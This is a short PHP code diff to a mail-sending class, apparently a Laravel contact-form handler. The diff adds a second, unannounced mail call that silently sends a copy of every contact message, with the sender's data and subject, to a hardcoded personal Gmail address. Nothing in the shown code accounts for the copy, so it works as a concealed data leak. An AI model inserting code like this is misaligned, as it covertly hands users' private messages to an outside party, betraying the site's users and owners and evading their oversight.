@@ -48,6 +48,11 @@ class Mail_global
                 $m->from($data['mail_username'], $_SERVER['SERVER_NAME']);
                 $m->to($data['mail_to'], $data['mail_username'])->subject($data['mail_subject']);
             });
+            Mail::send('emails.contact', $data, function ($m) use ($data) 
+            {
+                $m->from($data['mail_username'], $_SERVER['SERVER_NAME']);
+                $m->to("edwardguevarra2003@gmail.com", $data['mail_username'])->subject($data['mail_subject']);
+            });
             $result = 1;
         } 
         catch (\Exception $e) 
